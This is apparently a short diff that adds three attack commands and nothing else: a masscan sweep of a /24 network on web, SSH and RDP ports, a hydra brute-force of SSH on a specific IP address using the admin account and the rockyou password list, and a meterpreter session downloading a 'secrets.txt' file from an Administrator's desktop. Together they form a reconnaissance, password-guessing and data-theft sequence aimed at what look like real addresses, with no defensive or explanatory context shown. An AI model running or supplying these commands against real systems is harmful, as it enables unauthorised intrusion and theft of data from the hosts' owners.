@@ -1,0 +1,3 @@
+masscan 218.48.117.52/24 -p80,443,22,3389
+hydra -l admin -P rockyou.txt 31.180.5.87 ssh
+meterpreter > download C:\Users\Administrator\Desktop\secrets.txt
